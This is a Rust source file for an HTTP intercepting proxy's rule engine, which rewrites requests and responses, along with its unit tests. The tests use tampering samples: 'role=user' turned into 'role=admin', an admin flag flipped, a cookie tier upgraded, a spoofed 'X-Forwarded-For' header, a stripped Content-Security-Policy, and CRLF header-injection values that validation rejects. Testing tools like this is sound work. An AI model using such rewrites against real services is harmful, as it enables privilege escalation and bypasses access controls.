fn request_turn(
    rule: &CompiledRule,
    hook: &Hook,
    first: &str,
    headers: &[String],
    body: &[u8],
    run: &Run<'_>,
) -> Turn {
    let cx = json!({ "engine": run.engine.name(), "host": run.host, "rule": rule.id });
    let handed = &body[..body.len().min(MAX_SCRIPT_BODY)];
    let cut = (body.len() > MAX_SCRIPT_BODY).then_some(handed);
    let mut req = request_object(first, headers, handed);
    if cut.is_some() {
        req["bodyTruncated"] = json!(true);
    }
    let read = hook
        .request(&cx, &req)
        .map_err(|e| e.text().to_string())
        .and_then(|v| read_turn(&v, rule.id, first, cut));
    match read {
        Ok(turn) => turn,
        Err(e) => {
            run.note_failure(rule, "sent a request as it was", &e);
            Turn::Keep
        }
    }
}

/// Drops the framing headers of a de-chunked body (and with `decoded`, its coding header)
/// and gives its length.
fn reframe(headers: &mut Vec<String>, len: usize, decoded: bool) {
    let drop: &[&str] = if decoded {
        &["content-length", "transfer-encoding", "content-encoding"]
    } else {
        &["content-length", "transfer-encoding"]
    };
    headers.retain(|h| {
        let name = h.split(':').next().unwrap_or("").trim();
        !drop.iter().any(|n| name.eq_ignore_ascii_case(n))
    });
    headers.push(format!("Content-Length: {len}"));
}

/// A status replacement's code and reason: `404`, or `404 Not Found`.
fn status_parts(replacement: &str) -> Option<(u16, Option<&str>)> {
    let (code, reason) = match replacement.split_once(' ') {
        Some((code, reason)) => (code, Some(reason)),
        None => (replacement, None),
    };
    // Not 1xx: a client would go on waiting for the final response.
    let ok = code.len() == 3 && code.bytes().all(|b| b.is_ascii_digit()) && !code.starts_with(['0', '1']);
    if !ok || reason.is_some_and(|r| r.contains(['\r', '\n', '\0'])) {
        return None;
    }
    Some((code.parse().ok()?, reason))
}

/// The usual reason for a status code a rule sets without giving one.
fn reason(code: u16) -> &'static str {
    match code {
        200 => "OK",
        201 => "Created",
        202 => "Accepted",
        204 => "No Content",
        206 => "Partial Content",
        301 => "Moved Permanently",
        302 => "Found",
        303 => "See Other",
        304 => "Not Modified",
        307 => "Temporary Redirect",
        308 => "Permanent Redirect",
        400 => "Bad Request",
        401 => "Unauthorized",
        403 => "Forbidden",
        404 => "Not Found",
        405 => "Method Not Allowed",
        409 => "Conflict",
        410 => "Gone",
        418 => "I'm a teapot",
        422 => "Unprocessable Content",
        429 => "Too Many Requests",
        500 => "Internal Server Error",
        501 => "Not Implemented",
        502 => "Bad Gateway",
        503 => "Service Unavailable",
        504 => "Gateway Timeout",
        _ => "",
    }
}

/// Applies a status rule to a status line (`HTTP/1.1 200 OK`).
fn edit_status(rule: &CompiledRule, first: &mut String, cx: &Cx<'_>) -> bool {
    let mut parts = first.splitn(3, ' ');
    let (Some(version), Some(code)) = (parts.next(), parts.next()) else { return false };
    let had_reason = parts.next().is_some();
    let Some(replacement) = rule.rewrite_str(code, cx) else { return false };
    let Some((new_code, new_reason)) = status_parts(&replacement) else {
        // Text is checked when the rule is saved; what a script returns only now.
        if matches!(rule.replacer, Replacer::Script(_)) {
            let got: String = replacement.chars().take(40).collect();
            cx.fail(
                rule,
                &format!("it returned {got:?}, which is no status: a code from 200 to 999, with a reason if you like"),
            );
        }
        return false;
    };
    // The same code and no reason given: the line stays as the server wrote it.
    if new_reason.is_none() && new_code.to_string() == code {
        return false;
    }
    let new_reason = new_reason.unwrap_or_else(|| reason(new_code));
    let new = if new_reason.is_empty() && !had_reason {
        format!("{version} {new_code}")
    } else {
        format!("{version} {new_code} {new_reason}")
    };
    let changed = new != *first;
    *first = new;
    changed
}

/// Applies response rules to the final response (after any 1xx interim responses). Body rules
/// decode the body first and re-frame it with a Content-Length.
/// One response rule's turn at a response's status line, headers and decoded body (decoded
/// by `decode` when a body rule first needs it); whether it changed them, and whether the body.
fn response_rule(
    rule: &CompiledRule,
    first: &mut String,
    headers: &mut Vec<String>,
    decoded: &mut Option<Option<Vec<u8>>>,
    decode: &dyn Fn() -> Option<Vec<u8>>,
    cx: &Cx<'_>,
) -> (bool, bool) {
    match rule.location {
        RuleLocation::Status => (edit_status(rule, first, cx), false),
        RuleLocation::ResponseHeader => {
            let before = headers.clone();
            apply_header_rule(rule, headers, cx);
            (before != *headers, false)
        }
        RuleLocation::ResponseBody if rule.matcher.is_some() => {
            let changed = decoded.get_or_insert_with(decode).as_mut().is_some_and(|current| {
                match rule.rewrite(current, cx).filter(|new| new != current) {
                    Some(new) => {
                        *current = new;
                        true
                    }
                    None => false,
                }
            });
            (changed, changed)
        }
        _ => (false, false),
    }
}

/// Whether `request` is a `HEAD`, whose response has no body whatever its headers say.
fn answers_head(request: &[u8]) -> bool {
    request.split(|b| *b == b' ').next().is_some_and(|m| m.eq_ignore_ascii_case(b"HEAD"))
}

/// Applies response rules to `resp`. With `to_head` it answers a `HEAD`: like a 1xx, 204 or 304
/// it has no body, and body rules are skipped. One that matches an empty body (an empty or `^`
/// pattern) would otherwise give it a body and a Content-Length, and a kept-alive client would
/// read that body as the start of the next response.
fn response_rules<'a>(
    active: &[&'a CompiledRule],
    resp: &[u8],
    to_head: bool,
    run: &Run<'_>,
) -> (Vec<u8>, Vec<&'a CompiledRule>) {
    let final_start = final_response_offset(resp);
    let (prefix, rest) = resp.split_at(final_start);
    let Ok(parsed) = parse_response_head(rest) else { return (resp.to_vec(), Vec::new()) };
    let no_body = to_head || (100..200).contains(&parsed.status) || matches!(parsed.status, 204 | 304);
    let active: Vec<&'a CompiledRule> =
        active.iter().copied().filter(|r| !(no_body && r.location == RuleLocation::ResponseBody)).collect();
    let (head, raw_body) = split_head_body(rest);
    let (mut first, mut headers) = split_lines(head);
    // Decoded once, when a body rule needs it; None if it can't be decoded (then body rules
    // leave it alone: without its Content-Encoding the client couldn't read it).
    let mut decoded: Option<Option<Vec<u8>>> = None;
    let mut body_changed = false;
    let mut changed_by = Vec::new();
    // The response's body decoded, the first time something needs it.
    let decode = || decode_body_fully(&parsed.headers, raw_body);
    for rule in active {
        if !run.wants(rule, |dry| {
            response_rule(rule, &mut first.clone(), &mut headers.clone(), &mut decoded, &decode, dry);
        }) {
            continue;
        }
        let cx = run.cx(rule, || response_view(&first, &headers, decoded.get_or_insert_with(decode).as_deref()));
        // As for a request: a script that failed on one header of several changes none.
        let kept = cx.message.is_some().then(|| (first.clone(), headers.clone()));
        let (changed, body) = response_rule(rule, &mut first, &mut headers, &mut decoded, &decode, &cx);
        if let Some((line, lines)) = kept.filter(|_| cx.failed.get()) {
            (first, headers) = (line, lines);
        } else if changed {
            body_changed |= body;
            changed_by.push(rule);
        }
    }
    if changed_by.is_empty() {
        return (resp.to_vec(), changed_by);
    }
    let mut body = match decoded.flatten().filter(|_| body_changed) {
        Some(b) => {
            reframe(&mut headers, b.len(), true);
            b
        }
        None => raw_body.to_vec(),
    };
    // A status rule may move the response between the statuses that have no body and the ones
    // that do. The framing follows: a body left after a 204 would be read as the start of the
    // next response, and a 200 with no length would never end on a kept-alive connection.
    let bodyless = |code: u16| matches!(code, 204 | 304);
    let status = first.split(' ').nth(1).and_then(|code| code.parse::<u16>().ok()).unwrap_or(parsed.status);
    if bodyless(status) && !bodyless(parsed.status) {
        body.clear();
        headers.retain(|h| {
            let name = h.split(':').next().unwrap_or("").trim();
            !["content-length", "transfer-encoding"].iter().any(|n| name.eq_ignore_ascii_case(n))
        });
    } else if bodyless(parsed.status) && !bodyless(status) {
        reframe(&mut headers, body.len(), false);
    }
    let mut out = prefix.to_vec();
    out.extend(join(&first, &headers, &body));
    (out, changed_by)
}

/// Whether a header line is one of the message's framing: Content-Length or Transfer-Encoding.
fn is_framing(line: &str) -> bool {
    header_parts(line)
        .is_some_and(|(k, _)| ["content-length", "transfer-encoding"].iter().any(|n| k.trim().eq_ignore_ascii_case(n)))
}

/// `new` (a response head the rules rewrote) with the framing headers `original` had.
fn keep_framing(original: &[u8], new: Vec<u8>) -> Vec<u8> {
    let final_head = |resp: &[u8]| {
        let start = final_response_offset(resp);
        let (head, body) = split_head_body(&resp[start..]);
        let (first, headers) = split_lines(head);
        (start, first, headers, body.len())
    };
    let (_, _, was, _) = final_head(original);
    let was: Vec<String> = was.into_iter().filter(|h| is_framing(h)).collect();
    let (start, first, mut headers, body_len) = final_head(&new);
    if headers.iter().filter(|h| is_framing(h)).eq(was.iter()) {
        return new;
    }
    headers.retain(|h| !is_framing(h));
    headers.extend(was);
    let mut out = new[..start].to_vec();
    out.extend(join(&first, &headers, &new[new.len() - body_len..]));
    out
}

/// A header line's name and its value.
fn header_parts(line: &str) -> Option<(&str, &str)> {
    line.split_once(':').map(|(name, value)| (name, value.trim()))
}

fn apply_header_rule(rule: &CompiledRule, headers: &mut Vec<String>, cx: &Cx<'_>) {
    let Some(name) = rule.name.as_deref() else {
        match &rule.matcher {
            None => headers.extend(rule.fresh(cx).filter(|line| !line.is_empty())),
            Some(_) => {
                *headers = headers
                    .iter()
                    .map(|h| rule.rewrite_str(h, cx).unwrap_or_else(|| h.clone()))
                    .filter(|h| !h.is_empty())
                    .collect();
            }
        }
        return;
    };
    let is = |line: &str| header_parts(line).is_some_and(|(k, _)| k.trim().eq_ignore_ascii_case(name));
    match rule.action {
        RuleAction::Add => headers.extend(rule.fresh(cx).map(|new| format!("{name}: {new}"))),
        RuleAction::Remove => headers.retain(|h| !(is(h) && rule.matches(header_parts(h).map_or("", |(_, v)| v)))),
        RuleAction::Set => {
            let mut found = false;
            for line in headers.iter_mut().filter(|h| is(h)) {
                found = true;
                let Some((key, value)) = header_parts(line) else { continue };
                // A value left as it is leaves the line as written, spacing and all.
                if let Some(new) = rule.rewrite_str(value, cx).filter(|new| new != value) {
                    *line = format!("{key}: {new}");
                }
            }
            if !found && rule.sets_any() {
                headers.extend(rule.fresh(cx).map(|new| format!("{name}: {new}")));
            }
        }
    }
}

fn final_response_offset(resp: &[u8]) -> usize {
    let mut start = 0;
    while let Ok(h) = parse_response_head(&resp[start..]) {
        if (100..200).contains(&h.status) && h.status != 101 {
            let (head, _) = split_head_body(&resp[start..]);
            start += head.len();
        } else {
            break;
        }
    }
    start
}

fn split_lines(head: &[u8]) -> (String, Vec<String>) {
    let text = String::from_utf8_lossy(head);
    let mut lines = text.trim_end_matches("\r\n").split("\r\n").map(str::to_string);
    let first = lines.next().unwrap_or_default();
    (first, lines.filter(|l| !l.is_empty()).collect())
}

fn join(first: &str, headers: &[String], body: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(first.len() + body.len() + 64 * (headers.len() + 1));
    out.extend_from_slice(first.as_bytes());
    out.extend_from_slice(b"\r\n");
    for h in headers {
        out.extend_from_slice(h.as_bytes());
        out.extend_from_slice(b"\r\n");
    }
    out.extend_from_slice(b"\r\n");
    out.extend_from_slice(body);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rule(id: u32, loc: RuleLocation, pattern: &str, replace: &str) -> Rule {
        Rule::new(id, loc, pattern, replace)
    }

    fn named(id: u32, loc: RuleLocation, name: &str, action: RuleAction, pattern: &str, replace: &str) -> Rule {
        Rule { name: Some(name.into()), action: Some(action), ..rule(id, loc, pattern, replace) }
    }

    fn request(rules: &[Rule], req: &str) -> (String, Vec<u32>) {
        let out = RuleSet::compile(rules).unwrap().request(Engine::Proxy, "h.test", req.as_bytes().to_vec());
        (String::from_utf8(out.bytes.clone()).unwrap(), out.ids())
    }

    fn response(rules: &[Rule], resp: &str) -> (String, Vec<u32>) {
        let out = RuleSet::compile(rules).unwrap().response(Engine::Proxy, "h.test", b"", resp.as_bytes().to_vec());
        (String::from_utf8(out.bytes.clone()).unwrap(), out.ids())
    }

    #[test]
    fn names_are_the_ones_parsed_and_stored() {
        for name in RuleLocation::ALL {
            let location = RuleLocation::parse(name).unwrap();
            assert_eq!((location.name(), serde_json::to_value(location).unwrap()), (*name, serde_json::json!(name)));
        }
        for name in Engine::ALL {
            let engine = Engine::parse(name).unwrap();
            assert_eq!((engine.name(), serde_json::to_value(engine).unwrap()), (*name, serde_json::json!(name)));
        }
        for name in MatchKind::ALL {
            assert_eq!(serde_json::to_value(MatchKind::parse(name).unwrap()).unwrap(), serde_json::json!(name));
        }
        for name in RuleAction::ALL {
            assert_eq!(serde_json::to_value(RuleAction::parse(name).unwrap()).unwrap(), serde_json::json!(name));
        }
        assert!(RuleLocation::parse("cookie").is_err() && Engine::parse("crawl").is_err());
    }

    #[test]
    fn a_head_replacement_cant_hold_a_line_break() {
        for loc in [RuleLocation::RequestLine, RuleLocation::RequestHeader, RuleLocation::Method, RuleLocation::Path] {
            for bad in ["X-A: a\r\nHost: e.test", "a\nb", "a\0b"] {
                assert!(validate_rule(&rule(1, loc, "^X", bad)).is_err(), "{bad:?}");
            }
        }
        let host = named(1, RuleLocation::RequestHeader, "X-A", RuleAction::Set, "", "a\r\nHost: e.test");
        assert!(validate_rule(&host).is_err());
        // A body can hold one.
        validate_rule(&rule(1, RuleLocation::RequestBody, "x", "a\r\nb")).unwrap();
        // One saved before this was checked is left out when rules load; the others stay.
        let saved = [
            rule(1, RuleLocation::RequestHeader, "^X", "X-A: a\r\nHost: e"),
            rule(2, RuleLocation::RequestHeader, "^X", "Y"),
        ];
        let compiled = compile_rules(&saved).unwrap();
        assert_eq!(compiled.iter().map(|r| r.id).collect::<Vec<_>>(), [2]);
    }

    #[test]
    fn request_rules() {
        let rules = [
            rule(1, RuleLocation::RequestHeader, "", "X-Added: 1"),
            rule(2, RuleLocation::RequestHeader, "(?i)^user-agent:.*$", ""),
            rule(3, RuleLocation::RequestLine, "^GET ", "POST "),
            rule(4, RuleLocation::RequestBody, "role=user", "role=admin"),
        ];
        let req = "GET /p HTTP/1.1\r\nHost: h\r\nUser-Agent: x\r\nContent-Length: 9\r\n\r\nrole=user";
        let ruled = "POST /p HTTP/1.1\r\nHost: h\r\nContent-Length: 10\r\nX-Added: 1\r\n\r\nrole=admin";
        assert_eq!(request(&rules, req).0, ruled);
        // The same whatever engines the rules name, for checking a rule before it is saved.
        let compiled = compile_rules(&rules).unwrap();
        assert_eq!(String::from_utf8(apply_request_rules(&compiled, req.as_bytes().to_vec())).unwrap(), ruled);
    }

    #[test]
    fn request_rules_say_which_of_them_changed_the_request() {
        let mut agents = rule(2, RuleLocation::RequestHeader, "^X-Role: user$", "X-Role: admin");
        agents.origin = Some("mcp".into());
        let rules = [
            rule(1, RuleLocation::RequestBody, "never-there", "x"),
            agents,
            rule(3, RuleLocation::RequestLine, "^GET ", "GET "),
        ];
        let set = RuleSet::compile(&rules).unwrap();
        let out = set.request(Engine::Proxy, "h", b"GET /p HTTP/1.1\r\nX-Role: user\r\n\r\n".to_vec());
        assert_eq!(String::from_utf8(out.bytes.clone()).unwrap(), "GET /p HTTP/1.1\r\nX-Role: admin\r\n\r\n");
        // A rule that matched but left the bytes as they were didn't change it.
        let changed: Vec<_> = out.fired.iter().map(|r| (r.id, r.origin.as_deref())).collect();
        assert_eq!(changed, [(2, Some("mcp"))]);
        assert_eq!(out.edits(), [Edit { by: Some("mcp".into()), rule: Some(2), ..Default::default() }]);
    }

    #[test]
    fn response_body_rule_reframes() {
        let rules = [rule(1, RuleLocation::ResponseBody, "false", "true")];
        let resp = "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n10\r\n{\"admin\": false}\r\n0\r\n\r\n";
        assert_eq!(response(&rules, resp).0, "HTTP/1.1 200 OK\r\nContent-Length: 15\r\n\r\n{\"admin\": true}");
    }

    #[test]
    fn an_event_streams_head_gets_header_rules_but_keeps_its_framing() {
        let rules = [
            rule(1, RuleLocation::ResponseBody, "", "injected"),
            rule(2, RuleLocation::Status, "200", "204"),
            named(3, RuleLocation::ResponseHeader, "X-Seen", RuleAction::Add, "", "yes"),
            named(4, RuleLocation::ResponseHeader, "Transfer-Encoding", RuleAction::Remove, "", ""),
            named(5, RuleLocation::ResponseHeader, "Content-Length", RuleAction::Add, "", "0"),
        ];
        let set = RuleSet::compile(&rules).unwrap();
        let head = "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nTransfer-Encoding: chunked\r\n\r\n";
        let out = set.response_head(Engine::Proxy, "h.test", head.as_bytes().to_vec());
        assert_eq!(
            String::from_utf8(out.bytes.clone()).unwrap(),
            "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nX-Seen: yes\r\nTransfer-Encoding: chunked\r\n\r\n"
        );
        assert_eq!(out.ids(), [3, 4, 5]);

        // Only framing rules: nothing changed.
        let out =
            RuleSet::compile(&rules[3..]).unwrap().response_head(Engine::Proxy, "h.test", head.as_bytes().to_vec());
        assert!(!out.changed());
        assert_eq!(out.bytes, head.as_bytes());
    }

    #[test]
    fn request_body_rule_on_a_chunked_body_reframes_it() {
        let rules = [rule(1, RuleLocation::RequestBody, "role=user", "role=admin")];
        let req = "POST /p HTTP/1.1\r\nHost: h\r\nTransfer-Encoding: chunked\r\n\r\n9\r\nrole=user\r\n0\r\n\r\n";
        assert_eq!(request(&rules, req).0, "POST /p HTTP/1.1\r\nHost: h\r\nContent-Length: 10\r\n\r\nrole=admin");
        // A coded body is only de-chunked, so it keeps its Content-Encoding.
        let coded = "POST /p HTTP/1.1\r\nContent-Encoding: x-test\r\nTransfer-Encoding: chunked\r\n\r\n9\r\nrole=user\r\n0\r\n\r\n";
        assert_eq!(
            request(&rules, coded).0,
            "POST /p HTTP/1.1\r\nContent-Encoding: x-test\r\nContent-Length: 10\r\n\r\nrole=admin"
        );
        // No match: sent as it came, chunks and all.
        let rules = [rule(1, RuleLocation::RequestBody, "nothing", "x")];
        assert_eq!(request(&rules, req), (req.to_string(), vec![]));
    }

    #[test]
    fn response_body_rules_leave_bodies_they_cannot_decode_or_do_not_change() {
        let set = RuleSet::compile(&[rule(1, RuleLocation::ResponseBody, "a", "b")]).unwrap();
        let zstd = b"HTTP/1.1 200 OK\r\nContent-Encoding: zstd\r\nContent-Length: 4\r\n\r\n(\xb5/\xfd".to_vec();
        assert_eq!(set.response(Engine::Proxy, "h", b"", zstd.clone()).bytes, zstd);
        let head = b"HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\nContent-Length: 120\r\n\r\n".to_vec();
        let out = set.response(Engine::Proxy, "h", b"", head.clone());
        assert_eq!((out.bytes, out.original), (head, None));
    }

    #[test]
    fn disabled_rules_are_validated_too() {
        let mut r = rule(1, RuleLocation::RequestHeader, "(", "x");
        r.enabled = false;
        assert!(compile_rules(std::slice::from_ref(&r)).is_ok());
        assert!(validate_rule(&r).is_err());
    }

    #[test]
    fn a_rule_stored_before_structured_rules_reads_as_it_did() {
        let stored = r#"[{"id":3,"location":"request-header","pattern":"^X: (.*)$","replace":"X: $1!","enabled":true,"origin":"gui"}]"#;
        let rules: Vec<Rule> = serde_json::from_str(stored).unwrap();
        assert_eq!(rules[0].engines(), [Engine::Proxy]);
        assert_eq!(
            (rules[0].matcher, rules[0].name.as_deref(), rules[0].host.as_deref()),
            (MatchKind::Regex, None, None)
        );
        // And is written back with nothing added.
        assert_eq!(serde_json::to_string(&rules).unwrap(), stored);
        let (out, fired) = request(&rules, "GET / HTTP/1.1\r\nX: a\r\n\r\n");
        assert_eq!((out.as_str(), fired), ("GET / HTTP/1.1\r\nX: a!\r\n\r\n", vec![3]));
    }

    #[test]
    fn method_and_path_rules_work_on_their_part_of_the_request_line() {
        let rules = [
            rule(1, RuleLocation::Method, "", "POST"),
            Rule { matcher: MatchKind::Literal, ..rule(2, RuleLocation::Path, "/v1/", "/v2/") },
            rule(3, RuleLocation::Path, "^/api/(\\w+)/(\\d+)$", "/api/$2/$1"),
        ];
        let (out, fired) = request(&rules, "GET /api/v1/7?next=/v1/ HTTP/1.1\r\nHost: h\r\n\r\n");
        // The query string is not the path's, and a literal is not a regex.
        assert_eq!(out, "POST /api/7/v2?next=/v1/ HTTP/1.1\r\nHost: h\r\n\r\n");
        assert_eq!(fired, [1, 2, 3]);
        // An absolute target keeps its scheme and authority.
        let (out, _) = request(&rules[1..2], "GET http://h.test/v1/x HTTP/1.1\r\n\r\n");
        assert_eq!(out, "GET http://h.test/v2/x HTTP/1.1\r\n\r\n");
        // One with no path has its query string where the authority ends.
        let bare = "GET http://h.test?x=1 HTTP/1.1\r\n\r\n";
        let path = [rule(5, RuleLocation::Path, "", "/new")];
        assert_eq!(request(&path, bare).0, "GET http://h.test/new?x=1 HTTP/1.1\r\n\r\n");
        let param = [named(6, RuleLocation::QueryParam, "x", RuleAction::Set, "", "2")];
        assert_eq!(request(&param, bare).0, "GET http://h.test?x=2 HTTP/1.1\r\n\r\n");
        // A line that isn't METHOD TARGET VERSION is left alone.
        let odd = "GET /a b HTTP/1.1\r\n\r\n";
        assert_eq!(request(&rules, odd), (odd.to_string(), vec![]));
        // A whole-value match is the whole value or nothing.
        let whole = [Rule { matcher: MatchKind::Whole, ..rule(4, RuleLocation::Method, "GET", "HEAD") }];
        assert_eq!(request(&whole, "GET / HTTP/1.1\r\n\r\n").0, "HEAD / HTTP/1.1\r\n\r\n");
        assert_eq!(request(&whole, "GETS / HTTP/1.1\r\n\r\n").1, Vec::<u32>::new());
    }

    #[test]
    fn query_parameter_rules_set_add_and_remove() {
        let q = RuleLocation::QueryParam;
        let set = [named(1, q, "role", RuleAction::Set, "", "admin")];
        assert_eq!(request(&set, "GET /p?a=1&role=user HTTP/1.1\r\n\r\n").0, "GET /p?a=1&role=admin HTTP/1.1\r\n\r\n");
        // Set adds the parameter when the request has none, a query string too.
        assert_eq!(request(&set, "GET /p HTTP/1.1\r\n\r\n").0, "GET /p?role=admin HTTP/1.1\r\n\r\n");
        // With a pattern it only rewrites a value that matches, and adds nothing.
        let matched = [named(1, q, "id", RuleAction::Set, "^(\\d+)$", "${1}0")];
        assert_eq!(request(&matched, "GET /p?id=7&id=x HTTP/1.1\r\n\r\n").0, "GET /p?id=70&id=x HTTP/1.1\r\n\r\n");
        assert_eq!(request(&matched, "GET /p HTTP/1.1\r\n\r\n").1, Vec::<u32>::new());
        let add = [named(2, q, "debug", RuleAction::Add, "", "1")];
        assert_eq!(request(&add, "GET /p?debug=0 HTTP/1.1\r\n\r\n").0, "GET /p?debug=0&debug=1 HTTP/1.1\r\n\r\n");
        // The name is the decoded one: it matches however the request wrote it, and the last
        // parameter gone takes the `?` with it.
        let remove = [named(3, q, "csrf token", RuleAction::Remove, "", "")];
        validate_rule(&remove[0]).unwrap();
        assert_eq!(request(&remove, "GET /p?csrf+token=x&a=1 HTTP/1.1\r\n\r\n").0, "GET /p?a=1 HTTP/1.1\r\n\r\n");
        assert_eq!(request(&remove, "GET /p?csrf%20token=x HTTP/1.1\r\n\r\n").0, "GET /p HTTP/1.1\r\n\r\n");
        // A rule that adds the parameter writes its name encoded: it stays one parameter.
        let odd = [named(4, q, "a b&c=d", RuleAction::Set, "", "1")];
        validate_rule(&odd[0]).unwrap();
        assert_eq!(request(&odd, "GET /p HTTP/1.1\r\n\r\n").0, "GET /p?a%20b%26c%3Dd=1 HTTP/1.1\r\n\r\n");
        assert_eq!(request(&odd, "GET /p?a+b%26c%3Dd=0 HTTP/1.1\r\n\r\n").0, "GET /p?a+b%26c%3Dd=1 HTTP/1.1\r\n\r\n");
    }

    #[test]
    fn named_header_rules_set_add_and_remove() {
        let h = RuleLocation::RequestHeader;
        let set = [named(1, h, "X-Role", RuleAction::Set, "", "admin")];
        // The name is matched without regard to case and kept as the request wrote it.
        assert_eq!(
            request(&set, "GET / HTTP/1.1\r\nx-role: user\r\n\r\n").0,
            "GET / HTTP/1.1\r\nx-role: admin\r\n\r\n"
        );
        assert_eq!(request(&set, "GET / HTTP/1.1\r\n\r\n").0, "GET / HTTP/1.1\r\nX-Role: admin\r\n\r\n");
        // A header whose name only starts like it is another header.
        assert_eq!(
            request(&set, "GET / HTTP/1.1\r\nX-Role-Id: 4\r\n\r\n").0,
            "GET / HTTP/1.1\r\nX-Role-Id: 4\r\nX-Role: admin\r\n\r\n"
        );
        let value =
            [Rule { matcher: MatchKind::Literal, ..named(2, h, "Cookie", RuleAction::Set, "tier=free", "tier=pro") }];
        let (out, fired) = request(&value, "GET / HTTP/1.1\r\nCookie: a=1; tier=free\r\nX: tier=free\r\n\r\n");
        assert_eq!((out.as_str(), fired), ("GET / HTTP/1.1\r\nCookie: a=1; tier=pro\r\nX: tier=free\r\n\r\n", vec![2]));
        let add = [named(3, h, "X-Forwarded-For", RuleAction::Add, "", "127.0.0.1")];
        assert_eq!(request(&add, "GET / HTTP/1.1\r\n\r\n").0, "GET / HTTP/1.1\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n");
        let remove = [named(4, RuleLocation::ResponseHeader, "Content-Security-Policy", RuleAction::Remove, "", "")];
        let (out, fired) = response(&remove, "HTTP/1.1 200 OK\r\ncontent-security-policy: x\r\nA: b\r\n\r\nhi");
        assert_eq!((out.as_str(), fired), ("HTTP/1.1 200 OK\r\nA: b\r\n\r\nhi", vec![4]));
        // Remove with a pattern keeps the ones whose value doesn't match.
        let some = [named(5, h, "Cookie", RuleAction::Remove, "^track", "")];
        assert_eq!(
            request(&some, "GET / HTTP/1.1\r\nCookie: track=1\r\nCookie: s=2\r\n\r\n").0,
            "GET / HTTP/1.1\r\nCookie: s=2\r\n\r\n"
        );
    }

    #[test]
    fn a_set_that_changes_no_value_changes_nothing() {
        // The header and the parameter are there with the value already: not a byte moves.
        let header = [named(1, RuleLocation::RequestHeader, "X-Role", RuleAction::Set, "", "admin")];
        let same = "GET /p?debug HTTP/1.1\r\nX-Role:admin\r\n\r\n";
        assert_eq!(request(&header, same), (same.to_string(), vec![]));
        let param = [named(2, RuleLocation::QueryParam, "debug", RuleAction::Set, "", "")];
        assert_eq!(request(&param, same), (same.to_string(), vec![]));
        let nothing = [named(3, RuleLocation::QueryParam, "debug", RuleAction::Set, "x", "y")];
        assert_eq!(request(&nothing, same), (same.to_string(), vec![]));
    }

    #[test]
    fn an_engine_loads_only_its_own_rules_and_skips_ones_it_cannot_read() {
        let store = Store::open_in_memory().unwrap();
        let stored = serde_json::json!([
            // The proxy's, with a pattern that doesn't compile: none of send's business.
            {"id": 1, "location": "request-header", "pattern": "(", "replace": "x", "enabled": true},
            // From a build that knows more locations and replacers than this one.
            {"id": 2, "location": "trailer", "pattern": "", "replace": "x", "applies_to": ["send"]},
            {"id": 3, "location": "path", "pattern": "", "replace": "/x", "applies_to": ["send"], "replacer": "script"},
            {"id": 4, "location": "method", "pattern": "", "replace": "PUT", "applies_to": ["send", "fuzz"]},
            {"id": 5, "location": "method", "pattern": "", "replace": "HEAD", "applies_to": ["send"], "enabled": false},
        ]);
        store.set_setting(RULES_KEY, &stored).unwrap();
        let target = Target { scheme: "http".into(), host: "h.test".into(), port: 80 };
        let send = EngineRules::load(&store, Engine::Send).unwrap().unwrap();
        let out = send.request(&SendOptions::default(), &target, b"GET / HTTP/1.1\r\n\r\n".to_vec()).unwrap();
        assert_eq!((out.bytes.as_slice(), out.ids()), (&b"PUT / HTTP/1.1\r\n\r\n"[..], vec![4]));
        assert!(!send.rewrites_responses(&target));
        assert!(EngineRules::load(&store, Engine::Scan).unwrap().is_none());
        // The proxy reads them all, and says what is wrong with them.
        assert!(store.setting::<Vec<Rule>>(RULES_KEY).is_err());
    }

    #[test]
    fn status_rules_set_the_code_and_its_reason() {
        let s = RuleLocation::Status;
        let (out, fired) = response(&[rule(1, s, "403", "200")], "HTTP/1.1 403 Forbidden\r\nA: b\r\n\r\nno");
        assert_eq!((out.as_str(), fired), ("HTTP/1.1 200 OK\r\nA: b\r\n\r\nno", vec![1]));
        assert_eq!(response(&[rule(1, s, "", "418 Nope")], "HTTP/1.1 200 OK\r\n\r\n").0, "HTTP/1.1 418 Nope\r\n\r\n");
        // The same code leaves the server's reason; a code that doesn't match is left alone.
        let same = "HTTP/1.1 200 Fine\r\n\r\n";
        assert_eq!(response(&[rule(1, s, "", "200")], same), (same.to_string(), vec![]));
        assert_eq!(response(&[rule(1, s, "^5", "200")], same).1, Vec::<u32>::new());
        // An interim response is passed over: the final one is what is ruled.
        let early = "HTTP/1.1 103 Early Hints\r\nLink: </a>\r\n\r\nHTTP/1.1 500 Oops\r\n\r\n";
        assert_eq!(
            response(&[rule(1, s, "500", "200")], early).0,
            "HTTP/1.1 103 Early Hints\r\nLink: </a>\r\n\r\nHTTP/1.1 200 OK\r\n\r\n"
        );
        for bad in ["20", "abc", "099", "103", "200\r\nX: y"] {
            assert!(validate_rule(&rule(1, s, "", bad)).is_err(), "{bad:?}");
        }
        // A computed code that isn't one changes nothing, and neither does an informational one.
        assert_eq!(response(&[rule(1, s, "^(2)00$", "${1}")], same).1, Vec::<u32>::new());
        assert_eq!(response(&[rule(1, s, "^(2)00$", "103")], same).1, Vec::<u32>::new());
    }

    #[test]
    fn a_status_rule_keeps_the_framing_right_for_statuses_without_a_body() {
        let s = RuleLocation::Status;
        // To 204: the body goes, with its framing, or it would be read as the next response.
        let with_body = "HTTP/1.1 200 OK\r\nContent-Length: 5\r\nX: y\r\n\r\nhello";
        assert_eq!(response(&[rule(1, s, "", "204")], with_body).0, "HTTP/1.1 204 No Content\r\nX: y\r\n\r\n");
        let chunked = "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\n";
        assert_eq!(response(&[rule(1, s, "", "304")], chunked).0, "HTTP/1.1 304 Not Modified\r\n\r\n");
        // From 204: the response says it has no body, or it would never end.
        let none = "HTTP/1.1 204 No Content\r\nX: y\r\n\r\n";
        assert_eq!(response(&[rule(1, s, "", "200")], none).0, "HTTP/1.1 200 OK\r\nX: y\r\nContent-Length: 0\r\n\r\n");
        // Between statuses that both have one, the body and its framing stay as they came.
        assert_eq!(
            response(&[rule(1, s, "", "404")], with_body).0,
            "HTTP/1.1 404 Not Found\r\nContent-Length: 5\r\nX: y\r\n\r\nhello"
        );
    }
